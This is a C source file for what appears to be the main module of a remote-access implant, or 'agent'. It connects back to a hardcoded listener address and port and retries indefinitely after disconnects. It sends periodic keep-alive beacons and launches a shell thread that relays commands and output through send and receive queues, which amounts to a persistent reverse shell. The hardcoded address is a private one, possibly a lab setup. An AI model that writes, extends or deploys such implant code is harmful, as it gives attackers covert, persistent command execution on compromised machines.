#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <signal.h>
#include <errno.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"
#include "agent_handler.h"
#include "shell.h"

// Globals
// Receive Queue
Queue* agent_receive_queue;
pthread_mutex_t agent_receive_queue_lock;
// Send Queue
Queue* agent_send_queue;
pthread_mutex_t agent_send_queue_lock;
// Shell Receive Queue
Queue* shell_receive_queue;
pthread_mutex_t shell_receive_queue_lock;
// Shell Send Queue
Queue* shell_send_queue;
pthread_mutex_t shell_send_queue_lock;
// Start time
time_t start_time;
// Alarm flag
volatile sig_atomic_t agent_alive_flag = false;
// SIGINT flag
volatile sig_atomic_t agent_close_flag = false;
// Connected flag
volatile sig_atomic_t agent_disconnect_flag = false;

void agent_alive_alarm(int sig){
	agent_alive_flag = true;
}

void *keep_alive(void *vargp){
	Fragment* fragment;
	Queue_Message* message;

    debug_print("%s\n", "starting keep alive thread");
	
	signal(SIGALRM, agent_alive_alarm);
	alarm(ALIVE_FREQUENCY);
	while (!agent_close_flag && !agent_disconnect_flag){
		if (agent_alive_flag){
			debug_print("%s\n", "Sending alive packet");
			
			fragment = calloc(1, HEADER_SIZE);
            fragment->header.type = TYPE_ALIVE;
            fragment->header.alive_time = time(NULL) - start_time;
			
			message = malloc(sizeof(Queue_Message));
            message->id = 0;
            message->size = HEADER_SIZE;
            message->fragment = fragment;
			
			enqueue(agent_send_queue, &agent_send_queue_lock, message);
			
			agent_alive_flag = false;
			alarm(ALIVE_FREQUENCY);
		}
	}

    debug_print("%s\n", "agent keep alive thread done");
    return 0;
}

int connect_to_listener(char* ip_addr, int port){
    int sockfd, status;
    struct sockaddr_in addr;
    pthread_t agent_receive_tid, agent_send_tid, agent_handler_tid, keep_alive_tid, shell_tid;
    struct timeval tv;

    if (ip_addr == NULL || !port){
        printf("Bad IP or port\n");
        return RET_FATAL_ERROR;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
        printf("inet_pton failed\n");
        return RET_FATAL_ERROR;
    }

    // keep trying to connect to listener
    // agent_disconnect_flag global flag will keep track of our connection to listener
    // If listener disconnects, close all threads and sit in hybernation
    while(!agent_close_flag){

        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
            printf("socket failed\n");
            return RET_FATAL_ERROR;
        }

        tv.tv_sec = S_TIMEOUT;
        tv.tv_usec = 0;

        if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv))){
            printf("setsockopt failed\n");
            return RET_FATAL_ERROR;
        }

        if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
            debug_print("%s\n", "connect failed");
        }
        else{
            agent_disconnect_flag = false;
        
            // Start agent receive thread
            pthread_create(&agent_receive_tid, NULL, agent_receive_thread, &sockfd);
            // Start agent send thread
            pthread_create(&agent_send_tid, NULL, agent_send_thread, &sockfd);
            // Start agent message handler thread
            pthread_create(&agent_handler_tid, NULL, agent_handler_thread, &sockfd);
            // Start keep alive thread
            pthread_create(&keep_alive_tid, NULL, keep_alive, NULL);
            // Start shell thread
            pthread_create(&shell_tid, NULL, shell_thread, NULL);
            
            agent_alive_flag = true;
            
            pthread_join(agent_receive_tid, NULL);
            pthread_join(agent_send_tid, NULL);
            pthread_join(agent_handler_tid, NULL);
            pthread_join(keep_alive_tid, NULL);
            pthread_join(shell_tid, NULL);
        }

        if (!agent_close_flag) sleep(ALIVE_FREQUENCY);
    }

    debug_print("%s\n", "agent connect done");
    close(sockfd);
    return RET_OK;
}

#ifndef UNIT_TESTING
int main(int argc, char** argv){
    char* ip_addr = "10.0.2.15";
    int port = 55555;
    
    start_time = time(NULL);
    
    // Create receive queue
    agent_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_receive_queue_lock, NULL);
    // Create send queue
    agent_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_send_queue_lock, NULL);
    // Create shell receive queue
    shell_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&shell_receive_queue_lock, NULL);
    // Create shell send queue
    shell_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&shell_send_queue_lock, NULL);
    
    connect_to_listener(ip_addr, port);

    debug_print("%s\n", "closed cleanly");
    return RET_OK;
}
#endif /* UNIT_TESTING */


